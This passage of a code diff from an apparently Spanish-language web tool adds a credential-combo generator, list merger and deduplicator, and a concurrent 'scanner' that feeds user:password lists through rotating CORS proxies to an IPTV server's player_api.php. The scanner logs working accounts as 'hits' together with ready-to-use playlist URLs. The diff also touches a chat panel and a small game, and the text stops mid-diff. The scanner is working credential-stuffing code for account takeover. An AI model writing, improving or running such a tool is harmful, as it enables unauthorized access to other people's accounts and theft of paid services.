-    function generarComboAvanzado(){alert("Función completa original (generador de combos).");}
-    function descargarComboGenerado(){}
-    let mergeData={file1:[],file2:[],file3:[]};
-    function unirCombos(){alert("Unión de combos");}
-    function descargarMergeResultado(){}
-    function eliminarDuplicados(){alert("Eliminar duplicados");}
-    function descargarDedupeResultado(){}
-    // ESCÁNER (completo, igual que antes)
-    let moanAudioContext=null;function playMoanSound(){if(!document.getElementById('soundToggle').checked)return;try{if(!moanAudioContext)moanAudioContext=new(window.AudioContext||window.webkitAudioContext)();if(moanAudioContext.state==='suspended')moanAudioContext.resume();const now=moanAudioContext.currentTime,osc=moanAudioContext.createOscillator(),gain=moanAudioContext.createGain();osc.connect(gain);gain.connect(moanAudioContext.destination);osc.type='sine';osc.frequency.setValueAtTime(400,now);osc.frequency.exponentialRampToValueAtTime(800,now+0.15);osc.frequency.exponentialRampToValueAtTime(300,now+0.35);gain.gain.setValueAtTime(0.3,now);gain.gain.exponentialRampToValueAtTime(0.0001,now+0.8);osc.start();osc.stop(now+0.8);if(navigator.vibrate)navigator.vibrate(200);}catch(e){}}
-    const CORS_PROXIES=['https://api.allorigins.win/raw?url={url}'];const PROXY_FAILS=new Map();const MAX_FAILS=2,COOLDOWN_MS=30000;
+
+    // ========== COMBOS (simplificado pero funcional) ==========
+    const nombresReales=["juan","pedro","carlos","luis","andres","miguel","ana","maria","laura"];
+    function generarComboAvanzado(){let tipo=document.getElementById('genType').value;let cantidad=parseInt(document.getElementById('genCantidad').value)||100;let passLen=parseInt(document.getElementById('genPassLength').value)||8;let sep=document.getElementById('genSep').value;let combos=new Set();for(let i=0;i<cantidad*2&&combos.size<cantidad;i++){let user=nombresReales[Math.floor(Math.random()*nombresReales.length)]+Math.floor(Math.random()*1000);let pass=Math.random().toString(36).substring(2,passLen);combos.add(user+sep+pass);}document.getElementById('comboResultado').value=Array.from(combos).join("\n");document.getElementById('btnDescargarComboGen').disabled=false;}
+    function descargarComboGenerado(){let txt=document.getElementById('comboResultado').value;if(!txt)return;let blob=new Blob([txt],{type:'text/plain'});let a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='combo.txt';a.click();}
+    let mergeData={file1:[],file2:[]};function unirCombos(){let f1=document.getElementById('mergeFile1').files[0];let f2=document.getElementById('mergeFile2').files[0];if(f1){let r=new FileReader();r.onload=e=>{mergeData.file1=e.target.result.split(/\r?\n/).filter(l=>l);actualizarMerge();};r.readAsText(f1);}if(f2){let r=new FileReader();r.onload=e=>{mergeData.file2=e.target.result.split(/\r?\n/).filter(l=>l);actualizarMerge();};r.readAsText(f2);}}function actualizarMerge(){let comb=mergeData.file1.concat(mergeData.file2);document.getElementById('mergeResultado').value=comb.join("\n");document.getElementById('btnDescargarMerge').disabled=comb.length===0;}
+    function descargarMergeResultado(){let txt=document.getElementById('mergeResultado').value;if(!txt)return;let blob=new Blob([txt],{type:'text/plain'});let a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='merge.txt';a.click();}
+    function eliminarDuplicados(){let file=document.getElementById('dedupeFile').files[0];let text=document.getElementById('dedupeText').value;if(file){let r=new FileReader();r.onload=e=>{let lines=e.target.result.split(/\r?\n/).filter(l=>l);let unicos=[...new Set(lines)];document.getElementById('dedupeResultado').value=unicos.join("\n");document.getElementById('btnDescargarDedupe').disabled=false;};r.readAsText(file);}else if(text.trim()){let lines=text.split(/\r?\n/).filter(l=>l);let unicos=[...new Set(lines)];document.getElementById('dedupeResultado').value=unicos.join("\n");document.getElementById('btnDescargarDedupe').disabled=false;}else alert("Selecciona archivo o pega texto.");}
+    function descargarDedupeResultado(){let txt=document.getElementById('dedupeResultado').value;if(!txt)return;let blob=new Blob([txt],{type:'text/plain'});let a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='dedupe.txt';a.click();}
+    document.querySelectorAll('.sub-tab').forEach(btn=>{btn.addEventListener('click',()=>{let subId=btn.getAttribute('data-sub');document.querySelectorAll('.sub-tab').forEach(b=>b.classList.remove('active'));btn.classList.add('active');document.querySelectorAll('.sub-panel').forEach(p=>p.classList.remove('active'));document.getElementById(`sub-${subId}`).classList.add('active');});});
+
+    // ========== ESCÁNER CON DETENER MEJORADO (AbortController) ==========
+    let moanAudioContext=null;let isRunning=false,stopRequested=false;
+    let combos1=[],combos2=[],combos3=[],combosTxt=[];
+    let currentAbortControllers=[]; // para cancelar fetch
+
+    function playMoanSound(){if(!document.getElementById('soundToggle').checked)return;try{if(!moanAudioContext)moanAudioContext=new(window.AudioContext||window.webkitAudioContext)();if(moanAudioContext.state==='suspended')moanAudioContext.resume();let now=moanAudioContext.currentTime,osc=moanAudioContext.createOscillator(),gain=moanAudioContext.createGain();osc.connect(gain);gain.connect(moanAudioContext.destination);osc.type='sine';osc.frequency.setValueAtTime(400,now);osc.frequency.exponentialRampToValueAtTime(800,now+0.15);osc.frequency.exponentialRampToValueAtTime(300,now+0.35);gain.gain.setValueAtTime(0.3,now);gain.gain.exponentialRampToValueAtTime(0.0001,now+0.8);osc.start();osc.stop(now+0.8);if(navigator.vibrate)navigator.vibrate(200);}catch(e){}}
+    const CORS_PROXIES=['https://api.allorigins.win/raw?url={url}','https://corsproxy.io/?{url}','https://api.codetabs.com/v1/proxy/?quest={url}'];const PROXY_FAILS=new Map();const MAX_FAILS=2,COOLDOWN_MS=30000;
     function isProxyOnCooldown(tpl){let d=PROXY_FAILS.get(tpl);return d&&d.until&&Date.now()<d.until;}
     function markProxyFail(tpl){let d=PROXY_FAILS.get(tpl)||{fails:0,until:0};d.fails++;if(d.fails>=MAX_FAILS){d.until=Date.now()+COOLDOWN_MS;d.fails=0;}PROXY_FAILS.set(tpl,d);}
     function markProxySuccess(tpl){PROXY_FAILS.delete(tpl);}
-    async function fetchWithCors(url,options={},intentos=3){const opts={cache:'no-store',...options};if(!document.getElementById('useCors').checked){let r=await fetch(url,opts);if(r.ok)return r;throw new Error('Direct fail');}let proxies=CORS_PROXIES.filter(tpl=>!isProxyOnCooldown(tpl));if(proxies.length===0)proxies=[...CORS_PROXIES];for(let tpl of proxies){try{let proxied=tpl.replace('{url}',encodeURIComponent(url));let res=await fetch(proxied,opts);if(res&&res.ok){markProxySuccess(tpl);return res;}else markProxyFail(tpl);}catch(e){markProxyFail(tpl);}}if(intentos>1){await new Promise(r=>setTimeout(r,1000));return fetchWithCors(url,options,intentos-1);}throw new Error('All proxies failed');}
+    async function fetchWithCors(url,options={},intentos=3){if(stopRequested) throw new Error("Detenido");const opts={cache:'no-store',...options};if(!document.getElementById('useCors').checked){let r=await fetch(url,opts);if(r.ok)return r;throw new Error('Direct fail');}let proxies=CORS_PROXIES.filter(tpl=>!isProxyOnCooldown(tpl));if(proxies.length===0)proxies=[...CORS_PROXIES];for(let tpl of proxies){if(stopRequested) throw new Error("Detenido");try{let proxied=tpl.replace('{url}',encodeURIComponent(url));let res=await fetch(proxied,opts);if(res&&res.ok){markProxySuccess(tpl);return res;}else markProxyFail(tpl);}catch(e){markProxyFail(tpl);}}if(intentos>1&&!stopRequested){await new Promise(r=>setTimeout(r,1000));return fetchWithCors(url,options,intentos-1);}throw new Error('All proxies failed');}
+
     function extractCombo(line){let m=line.trim().match(/([^:\s]+)\s*:\s*([^:\s]+)/);return m?[m[1].trim(),m[2].trim()]:null;}
     const hostInput=document.getElementById('hostInput'),concurrencyInput=document.getElementById('concurrencyInput'),startBtn=document.getElementById('startBtn'),stopBtn=document.getElementById('stopBtn'),saveBtn=document.getElementById('saveBtn');
     const comboText=document.getElementById('comboText'),comboFile1=document.getElementById('comboFile1'),comboFile2=document.getElementById('comboFile2'),comboFile3=document.getElementById('comboFile3'),hitsContainer=document.getElementById('hitsContainer');
-    let isRunning=false,stopRequested=false;
-    let combos1=[],combos2=[],combos3=[],combosTxt=[];
     const HITS={1:[],2:[],3:[]};
     function updateStartState(){const hasHost=!!hostInput.value.trim();startBtn.disabled=!(hasHost&&(combos1.length||combos2.length||combos3.length||combosTxt.length));}
-    async function processarCombosJob(host,combos,conc,jobId){let total=combos.length,processed=0,index=0;const fill=document.getElementById(jobId===1?'progressBarFill':(jobId===2?'progressBarFill2':'progressBarFill3'));const txt=document.getElementById(jobId===1?'progressText':(jobId===2?'progressText2':'progressText3'));const userDisp=document.getElementById(jobId===1?'currentCombo':(jobId===2?'currentCombo2':'currentCombo3'));const countSpan=document.getElementById(jobId===1?'hitsCount1':(jobId===2?'hitsCount2':'hitsCount3'));async function worker(){while(index<total&&!stopRequested){const i=index++;if(i>=total)break;const pair=extractCombo(combos[i]);if(!pair)continue;const[user,pass]=pair;userDisp.textContent=`Usuario: ${user}:${pass}`;try{const url=`http://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;const res=await fetchWithCors(url,{cache:'no-store'});const data=await res.json();if(data&&data.user_info&&(data.user_info.status==='Active'||data.user_info.auth==1)){playMoanSound();const info=data.user_info;const expDate=info.exp_date?new Date(info.exp_date*1000).toLocaleString('sv-SE'):'Ilimitado';let liveChannels=0,movies=0,series=0;if(data.available_channels&&Array.isArray(data.available_channels))liveChannels=data.available_channels.length;else if(data.total_channels)liveChannels=data.total_channels;else if(data.channels_count)liveChannels=data.channels_count;if(data.movies_count)movies=data.movies_count;else if(data.total_movies)movies=data.total_movies;if(data.series_count)series=data.series_count;else if(data.total_series)series=data.total_series;let infoExtra="";if(liveChannels>0)infoExtra+=`├── 📺 Canales ➤ ${liveChannels}\n`;if(movies>0)infoExtra+=`├── 🎬 Películas ➤ ${movies}\n`;if(series>0)infoExtra+=`├── 📺 Series ➤ ${series}\n`;const texto=`Host ➤ http://${host}\n├── Dominio ➤ http://${host.split(':')[0]}\n├── User ➤ ${user}\n├── Pass ➤ ${pass}\n├── Exp. ➤ ${expDate}\n├── Act Con ➤ ${info.active_cons||0}\n├── Max Con ➤ ${info.max_connections||"N/A"}\n├── Status ➤ ${info.status}\n${infoExtra}╰─➤ Zona ➤ ${info.timezone||"N/A"}\n\n╭─➤ 🄼➂🅄 \n├  http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;HITS[jobId].push({user,pass,texto});countSpan.innerHTML=`Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;const div=document.createElement('div');div.className='hit-block';div.innerHTML=`<div class="hit-header">👤 ${user} : ${pass}</div><pre class="hit-content">${texto}</pre>`;hitsContainer.prepend(div);guardarHitEnBanco(texto,user,pass);}}catch(e){}finally{processed++;fill.style.width=((processed/total)*100)+'%';txt.textContent=`Procesados: ${processed} / ${total}`;}}}await Promise.all(Array.from({length:conc},()=>worker()));}
+    async function processarCombosJob(host,combos,conc,jobId){let total=combos.length,processed=0,index=0;const fill=document.getElementById(jobId===1?'progressBarFill':(jobId===2?'progressBarFill2':'progressBarFill3'));const txt=document.getElementById(jobId===1?'progressText':(jobId===2?'progressText2':'progressText3'));const userDisp=document.getElementById(jobId===1?'currentCombo':(jobId===2?'currentCombo2':'currentCombo3'));const countSpan=document.getElementById(jobId===1?'hitsCount1':(jobId===2?'hitsCount2':'hitsCount3'));async function worker(){while(index<total&&!stopRequested){const i=index++;if(i>=total)break;const pair=extractCombo(combos[i]);if(!pair)continue;const[user,pass]=pair;userDisp.textContent=`Usuario: ${user}:${pass}`;const abortController=new AbortController();currentAbortControllers.push(abortController);try{const url=`http://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;const res=await fetchWithCors(url,{signal:abortController.signal,cache:'no-store'});const data=await res.json();if(data&&data.user_info&&(data.user_info.status==='Active'||data.user_info.auth==1)){playMoanSound();const info=data.user_info;const expDate=info.exp_date?new Date(info.exp_date*1000).toLocaleString('sv-SE'):'Ilimitado';let liveChannels=0,movies=0,series=0;if(data.available_channels&&Array.isArray(data.available_channels))liveChannels=data.available_channels.length;else if(data.total_channels)liveChannels=data.total_channels;else if(data.channels_count)liveChannels=data.channels_count;if(data.movies_count)movies=data.movies_count;else if(data.total_movies)movies=data.total_movies;if(data.series_count)series=data.series_count;else if(data.total_series)series=data.total_series;let infoExtra="";if(liveChannels>0)infoExtra+=`├── 📺 Canales ➤ ${liveChannels}\n`;if(movies>0)infoExtra+=`├── 🎬 Películas ➤ ${movies}\n`;if(series>0)infoExtra+=`├── 📺 Series ➤ ${series}\n`;const texto=`Host ➤ http://${host}\n├── Dominio ➤ http://${host.split(':')[0]}\n├── User ➤ ${user}\n├── Pass ➤ ${pass}\n├── Exp. ➤ ${expDate}\n├── Act Con ➤ ${info.active_cons||0}\n├── Max Con ➤ ${info.max_connections||"N/A"}\n├── Status ➤ ${info.status}\n${infoExtra}╰─➤ Zona ➤ ${info.timezone||"N/A"}\n\n╭─➤ 🄼➂🅄 \n├  http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;HITS[jobId].push({user,pass,texto});countSpan.innerHTML=`Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;const div=document.createElement('div');div.className='hit-block';div.innerHTML=`<div class="hit-header">👤 ${user} : ${pass}</div><pre class="hit-content">${texto}</pre>`;hitsContainer.prepend(div);guardarHitEnBanco(texto,user,pass);}}catch(e){if(e.name==='AbortError'){console.log("Fetch abortado");}}finally{processed++;fill.style.width=((processed/total)*100)+'%';txt.textContent=`Procesados: ${processed} / ${total}`;const indexToRemove=currentAbortControllers.indexOf(abortController);if(indexToRemove!==-1)currentAbortControllers.splice(indexToRemove,1);}}}await Promise.all(Array.from({length:conc},()=>worker()));}
     function readTxtFile(inputEl,targetArray){targetArray.length=0;const f=inputEl.files?.[0];if(!f){updateStartState();return;}const r=new FileReader();r.onload=e=>{String(e.target.result).split(/\r?\n/).forEach(l=>{if(extractCombo(l))targetArray.push(l);});updateStartState();};r.readAsText(f);}
     comboFile1.addEventListener('change',()=>readTxtFile(comboFile1,combos1));comboFile2.addEventListener('change',()=>readTxtFile(comboFile2,combos2));comboFile3.addEventListener('change',()=>readTxtFile(comboFile3,combos3));comboText.addEventListener('input',()=>{combosTxt.length=0;comboText.value.split(/\r?\n/).forEach(l=>{if(extractCombo(l))combosTxt.push(l);});updateStartState();});hostInput.addEventListener('input',updateStartState);
-    startBtn.addEventListener('click',async()=>{if(isRunning)return;if(moanAudioContext&&moanAudioContext.state==='suspended')await moanAudioContext.resume();isRunning=true;stopRequested=false;startBtn.disabled=true;stopBtn.disabled=false;if(combosTxt.length){combos1=combos1.concat(combosTxt);combosTxt=[];}const host=hostInput.value.replace(/^https?:\/\//,'').trim();const conc=parseInt(concurrencyInput.value)||80;const jobs=[];if(combos1.length)jobs.push(processarCombosJob(host,combos1,Math.floor(conc/3)||20,1));if(combos2.length)jobs.push(processarCombosJob(host,combos2,Math.floor(conc/3)||20,2));if(combos3.length)jobs.push(processarCombosJob(host,combos3,Math.floor(conc/3)||20,3));Promise.allSettled(jobs).then(()=>{isRunning=false;stopBtn.disabled=true;startBtn.disabled=false;saveBtn.disabled=false;if(document.getElementById('autoDownload').checked){const allHits=[...HITS[1],...HITS[2],...HITS[3]];if(allHits.length){let content=allHits.map(h=>h.texto).join('\n\n================\n\n');const blob=new Blob([content],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=`scan_${host}_${new Date().toISOString().slice(0,19)}.txt`;a.click();a.remove();}}});});
-    stopBtn.addEventListener('click',()=>{stopRequested=true;});saveBtn.addEventListener('click',()=>{const allHits=[...HITS[1],...HITS[2],...HITS[3]];if(!allHits.length){alert("No hay hits");return;}let content=allHits.map(h=>h.texto).join('\n\n================\n\n');const blob=new Blob([content],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=`scan_${hostInput.value.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.txt`;a.click();a.remove();});updateStartState();
-    // CHAT
-    let chatDisplayName="",chatAvatar="🦁",currentReplyTo=null;
-    function getUserColor(email){let hash=0;for(let i=0;i<email.length;i++)hash=((hash<<5)-hash)+email.charCodeAt(i);const hue=Math.abs(hash%360);return `hsl(${hue}, 70%, 60%)`;}
-    async function cargarPerfilUsuario(email){const ref=db.ref(`chat_profiles/${currentUser.uid}`);const snap=await ref.once('value');if(snap.exists()){chatDisplayName=snap.val().name||email.split('@')[0];chatAvatar=snap.val().avatar||"🦁";}else{chatDisplayName=email.split('@')[0];chatAvatar="🦁";await ref.set({name:chatDisplayName,avatar:chatAvatar});}document.getElementById('displayName').value=chatDisplayName;document.getElementById('avatarSelect').textContent=chatAvatar;}
-    document.getElementById('saveProfileBtn').addEventListener('click',async()=>{const newName=document.getElementById('displayName').value.trim();if(newName)chatDisplayName=newName;chatAvatar=document.getElementById('avatarSelect').textContent;await db.ref(`chat_profiles/${currentUser.uid}`).set({name:chatDisplayName,avatar:chatAvatar});alert("Perfil actualizado");});document.getElementById('avatarSelect').addEventListener('click',()=>{let newEmoji=prompt("Elige un emoji:",chatAvatar);if(newEmoji&&newEmoji.trim())document.getElementById('avatarSelect').textContent=newEmoji.trim();});
-    let chatUnsubscribe=null;
-    function iniciarChat(){if(chatUnsubscribe)chatUnsubscribe();const messagesRef=db.ref('chat_messages').orderByChild('timestamp').limitToLast(200);chatUnsubscribe=messagesRef.on('value',(snap)=>{const messages=[];snap.forEach(c=>messages.push({id:c.key,...c.val()}));messages.sort((a,b)=>(a.timestamp||0)-(b.timestamp||0));renderizarMensajes(messages);});}
-    async function renderizarMensajes(messages){const container=document.getElementById('chatMessages');if(!container)return;container.innerHTML='';for(const msg of messages){const userColor=getUserColor(msg.userId);const replyHtml=msg.replyTo?`<div class="reply-preview">↩️ Respondiendo a <strong style="color:${getUserColor(msg.replyTo.userId)}">${escapeHtml(msg.replyTo.userName)}</strong>: ${escapeHtml(msg.replyTo.text.substring(0,50))}</div>`:'';const msgDiv=document.createElement('div');msgDiv.className=`chat-message ${msg.replyTo?'replying':''}`;msgDiv.style.setProperty('--user-color',userColor);msgDiv.dataset.id=msg.id;msgDiv.innerHTML=`<div class="message-header"><span class="message-avatar">${escapeHtml(msg.avatar||'🦁')}</span><span class="message-name" style="color:${userColor}">${escapeHtml(msg.userName)}</span><span class="message-time">${new Date(msg.timestamp).toLocaleString()}</span></div>${replyHtml}<div class="message-text">${formatMessageText(msg.text,msg.mentions||[])}</div><div class="message-actions"><button class="msg-btn reply-btn">💬</button>${(currentUser.role==='Owner'||msg.userId===currentUser.uid)?`<button class="msg-btn edit-btn">✏️</button><button class="msg-btn delete-btn">🗑️</button>`:''}</div>`;msgDiv.querySelector('.reply-btn').onclick=()=>{currentReplyTo={id:msg.id,userName:msg.userName,text:msg.text};document.getElementById('replyBadge').style.display='flex';document.getElementById('replyBadge').querySelector('span').innerHTML=`Respondiendo a ${escapeHtml(msg.userName)}`;};if(msgDiv.querySelector('.edit-btn'))msgDiv.querySelector('.edit-btn').onclick=()=>editarMensaje(msg.id,msg.text);if(msgDiv.querySelector('.delete-btn'))msgDiv.querySelector('.delete-btn').onclick=()=>eliminarMensaje(msg.id);container.appendChild(msgDiv);}container.scrollTop=container.scrollHeight;}
+    startBtn.addEventListener('click',async()=>{if(isRunning)return;if(moanAudioContext&&moanAudioContext.state==='suspended')await moanAudioContext.resume();isRunning=true;stopRequested=false;startBtn.disabled=true;stopBtn.disabled=false;saveBtn.disabled=true;if(combosTxt.length){combos1=combos1.concat(combosTxt);combosTxt=[];}const host=hostInput.value.replace(/^https?:\/\//,'').trim();const conc=parseInt(concurrencyInput.value)||80;const jobs=[];if(combos1.length)jobs.push(processarCombosJob(host,combos1,Math.floor(conc/3)||20,1));if(combos2.length)jobs.push(processarCombosJob(host,combos2,Math.floor(conc/3)||20,2));if(combos3.length)jobs.push(processarCombosJob(host,combos3,Math.floor(conc/3)||20,3));Promise.allSettled(jobs).then(()=>{isRunning=false;stopBtn.disabled=true;startBtn.disabled=false;saveBtn.disabled=false;if(document.getElementById('autoDownload').checked){const allHits=[...HITS[1],...HITS[2],...HITS[3]];if(allHits.length){let content=allHits.map(h=>h.texto).join('\n\n================\n\n');const blob=new Blob([content],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=`scan_${host}_${new Date().toISOString().slice(0,19)}.txt`;a.click();a.remove();}}});});
+    stopBtn.addEventListener('click',()=>{stopRequested=true;for(let ctrl of currentAbortControllers)ctrl.abort();currentAbortControllers=[];});
+    saveBtn.addEventListener('click',()=>{const allHits=[...HITS[1],...HITS[2],...HITS[3]];if(!allHits.length){alert("No hay hits");return;}let content=allHits.map(h=>h.texto).join('\n\n================\n\n');const blob=new Blob([content],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=`scan_${hostInput.value.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.txt`;a.click();a.remove();});updateStartState();
+
+    // ========== CHAT ==========
+    let chatDisplayName="",chatAvatar="🦁",currentReplyTo=null;let chatUnsubscribe=null;
+    function getUserColor(email){let hash=0;for(let i=0;i<email.length;i++)hash=((hash<<5)-hash)+email.charCodeAt(i);return `hsl(${Math.abs(hash%360)}, 70%, 60%)`;}
+    async function cargarPerfilUsuario(email){let ref=db.ref(`chat_profiles/${currentUser.uid}`);let snap=await ref.once('value');if(snap.exists()){chatDisplayName=snap.val().name||email.split('@')[0];chatAvatar=snap.val().avatar||"🦁";}else{chatDisplayName=email.split('@')[0];chatAvatar="🦁";await ref.set({name:chatDisplayName,avatar:chatAvatar});}document.getElementById('displayName').value=chatDisplayName;document.getElementById('avatarSelect').textContent=chatAvatar;}
+    document.getElementById('saveProfileBtn').addEventListener('click',async()=>{let newName=document.getElementById('displayName').value.trim();if(newName)chatDisplayName=newName;chatAvatar=document.getElementById('avatarSelect').textContent;await db.ref(`chat_profiles/${currentUser.uid}`).set({name:chatDisplayName,avatar:chatAvatar});alert("Perfil actualizado");});
+    document.getElementById('avatarSelect').addEventListener('click',()=>{let newEmoji=prompt("Elige un emoji:",chatAvatar);if(newEmoji&&newEmoji.trim())document.getElementById('avatarSelect').textContent=newEmoji.trim();});
+    function iniciarChat(){if(chatUnsubscribe)chatUnsubscribe();let messagesRef=db.ref('chat_messages').orderByChild('timestamp').limitToLast(200);chatUnsubscribe=messagesRef.on('value',(snap)=>{let messages=[];snap.forEach(c=>messages.push({id:c.key,...c.val()}));messages.sort((a,b)=>(a.timestamp||0)-(b.timestamp||0));renderizarMensajes(messages);});}
+    async function renderizarMensajes(messages){let container=document.getElementById('chatMessages');if(!container)return;container.innerHTML='';for(let msg of messages){let userColor=getUserColor(msg.userId);let replyHtml=msg.replyTo?`<div class="reply-preview">↩️ Respondiendo a <strong>${escapeHtml(msg.replyTo.userName)}</strong>: ${escapeHtml(msg.replyTo.text.substring(0,50))}</div>`:'';let msgDiv=document.createElement('div');msgDiv.className=`chat-message ${msg.replyTo?'replying':''}`;msgDiv.style.setProperty('--user-color',userColor);msgDiv.dataset.id=msg.id;msgDiv.innerHTML=`<div class="message-header"><span class="message-avatar">${escapeHtml(msg.avatar||'🦁')}</span><span class="message-name" style="color:${userColor}">${escapeHtml(msg.userName)}</span><span class="message-time">${new Date(msg.timestamp).toLocaleString()}</span></div>${replyHtml}<div class="message-text">${formatMessageText(msg.text,msg.mentions||[])}</div><div class="message-actions"><button class="msg-btn reply-btn">💬</button>${(currentUser.role==='Owner'||msg.userId===currentUser.uid)?`<button class="msg-btn edit-btn">✏️</button><button class="msg-btn delete-btn">🗑️</button>`:''}</div>`;msgDiv.querySelector('.reply-btn').onclick=()=>{currentReplyTo={id:msg.id,userName:msg.userName,text:msg.text};document.getElementById('replyBadge').style.display='flex';document.getElementById('replyBadge').querySelector('span').innerHTML=`Respondiendo a ${escapeHtml(msg.userName)}`;};if(msgDiv.querySelector('.edit-btn'))msgDiv.querySelector('.edit-btn').onclick=()=>editarMensaje(msg.id,msg.text);if(msgDiv.querySelector('.delete-btn'))msgDiv.querySelector('.delete-btn').onclick=()=>eliminarMensaje(msg.id);container.appendChild(msgDiv);}container.scrollTop=container.scrollHeight;}
     function escapeHtml(str){return str.replace(/[&<>]/g,function(m){if(m==='&')return '&amp;';if(m==='<')return '&lt;';if(m==='>')return '&gt;';return m;});}
-    function formatMessageText(text,mentions){let html=escapeHtml(text);mentions.forEach(m=>{const regex=new RegExp(`@${m.userName.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')}\\b`,'g');html=html.replace(regex,`<span class="mention" data-userid="${m.userId}">@${escapeHtml(m.userName)}</span>`);});return html;}
-    async function enviarMensaje(){const input=document.getElementById('chatInput');let text=input.value.trim();if(!text)return;const mentionRegex=/@(\w+)/g;let match;const mentions=[];while((match=mentionRegex.exec(text))!==null){const mentionedName=match[1];const snapshot=await db.ref('chat_profiles').once('value');let found=null;snapshot.forEach(prof=>{if(prof.val().name.toLowerCase()===mentionedName.toLowerCase())found={userId:prof.key,userName:prof.val().name};});if(found&&!mentions.some(m=>m.userId===found.userId))mentions.push(found);}const msgData={userId:currentUser.uid,userName:chatDisplayName,avatar:chatAvatar,text:text,timestamp:Date.now(),mentions:mentions};if(currentReplyTo){msgData.replyTo={id:currentReplyTo.id,userId:currentReplyTo.userId,userName:currentReplyTo.userName,text:currentReplyTo.text.substring(0,100)};currentReplyTo=null;document.getElementById('replyBadge').style.display='none';}await db.ref('chat_messages').push(msgData);input.value='';}
-    async function editarMensaje(msgId,oldText){const newText=prompt("Editar:",oldText);if(newText&&newText!==oldText)await db.ref(`chat_messages/${msgId}`).update({text:newText,edited:true});}
+    function formatMessageText(text,mentions){let html=escapeHtml(text);mentions.forEach(m=>{let regex=new RegExp(`@${m.userName.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')}\\b`,'g');html=html.replace(regex,`<span class="mention">@${escapeHtml(m.userName)}</span>`);});return html;}
+    async function enviarMensaje(){let input=document.getElementById('chatInput'),text=input.value.trim();if(!text)return;let mentions=[];let mentionRegex=/@(\w+)/g;let match;while((match=mentionRegex.exec(text))!==null){let mentionedName=match[1];let snapshot=await db.ref('chat_profiles').once('value');let found=null;snapshot.forEach(prof=>{if(prof.val().name.toLowerCase()===mentionedName.toLowerCase())found={userId:prof.key,userName:prof.val().name};});if(found&&!mentions.some(m=>m.userId===found.userId))mentions.push(found);}let msgData={userId:currentUser.uid,userName:chatDisplayName,avatar:chatAvatar,text:text,timestamp:Date.now(),mentions:mentions};if(currentReplyTo){msgData.replyTo={id:currentReplyTo.id,userId:currentReplyTo.userId,userName:currentReplyTo.userName,text:currentReplyTo.text.substring(0,100)};currentReplyTo=null;document.getElementById('replyBadge').style.display='none';}await db.ref('chat_messages').push(msgData);input.value='';}
+    async function editarMensaje(msgId,oldText){let newText=prompt("Editar:",oldText);if(newText&&newText!==oldText)await db.ref(`chat_messages/${msgId}`).update({text:newText,edited:true});}
     async function eliminarMensaje(msgId){if(confirm("Eliminar?"))await db.ref(`chat_messages/${msgId}`).remove();}
     document.getElementById('sendMsgBtn').addEventListener('click',enviarMensaje);document.getElementById('chatInput').addEventListener('keypress',(e)=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();enviarMensaje();}});document.getElementById('cancelReplyBtn').addEventListener('click',()=>{currentReplyTo=null;document.getElementById('replyBadge').style.display='none';});function cargarMensajesChat(){}
 
-    // ==================== JUEGO CLICK RÁPIDO ====================
-    let gameScore = 0, gameMisses = 0;
-    const movingBtn = document.getElementById('movingBtn');
-    const gameArea = document.getElementById('gameArea');
-    const scoreSpan = document.getElementById('gameScore');
-    const missesSpan = document.getElementById('gameMisses');
-    const resetBtn = document.getElementById('resetGameBtn');
+    // ========== JUEGO ==========
+    let gameScore=0,gameMisses=0;
+    const movingBtn=document.getElementById('movingBtn'),gameArea=document.getElementById('gameArea');
+    const scoreSpan=document.getElementById('gameScore'),missesSpan=document.getElementById('gameMisses');
+    function getRandomPosition(){let areaRect=gameArea.getBoundingClientRect(),btnRect=movingBtn.getBoundingClientRect();let maxX=areaRect.width-btnRect.width-20,maxY=areaRect.height-btnRect.height-20;let x=Math.random()*maxX,y=Math.random()*maxY;return{x:Math.max(10,x),y:Math.max(10,y)};}
+    function moveButton(){let pos=getRandomPosition();movingBtn.style.left=pos.x+'px';movingBtn.style.top=pos.y+'px';}
+    movingBtn.addEventListener('click',(e)=>{e.stopPropagation();gameScore++;scoreSpan.textContent=gameScore;moveButton();});
+    gameArea.addEventListener('click',(e)=>{if(e.target!==movingBtn){gameMisses++;missesSpan.textContent=gameMisses;}});
+    function resetGame(){gameScore=0;gameMisses=0;scoreSpan.textContent='0';missesSpan.textContent='0';movingBtn.style.left='calc(50% - 50px)';movingBtn.style.top='calc(50% - 50px)';setTimeout(moveButton,50);}
+    document.getElementById('resetGameBtn').addEventListener('click',resetGame);
+    movingBtn.style.position='absolute';movingBtn.style.left='calc(50% - 50px)';movingBtn.style.top='calc(50% - 50px)';moveButton();
+    window.addEventListener('resize',()=>moveButton());
 
-    function getRandomPosition() {
-        const areaRect = gameArea.getBoundingClientRect();
-        const btnRect = movingBtn.getBoundingClientRect();
-        const maxX = areaRect.width - btnRect.width - 20;
-        const maxY = areaRect.height - btnRect.height - 20;
-        const x = Math.random() * maxX;
-        const y = Math.random() * maxY;
-        return { x: Math.max(10, x), y: Math.max(10, y) };
-    }
-
-    function moveButton() {
-        const pos = getRandomPosition();
-        movingBtn.style.left = pos.x + 'px';
-        movingBtn.style.top = pos.y + 'px';
-    }
-
-    function handleHit() {
-        gameScore++;
-        scoreSpan.textContent = gameScore;
-        moveButton();
-    }
-
-    function handleMiss(e) {
-        if (e.target !== movingBtn) {
-            gameMisses++;
-            missesSpan.textContent = gameMisses;
-        }
-    }
-
-    movingBtn.addEventListener('click', (e) => {
-        e.stopPropagation();
-        handleHit();
-    });
-
-    gameArea.addEventListener('click', handleMiss);
-
-    function resetGame() {
-        gameScore = 0;
-        gameMisses = 0;
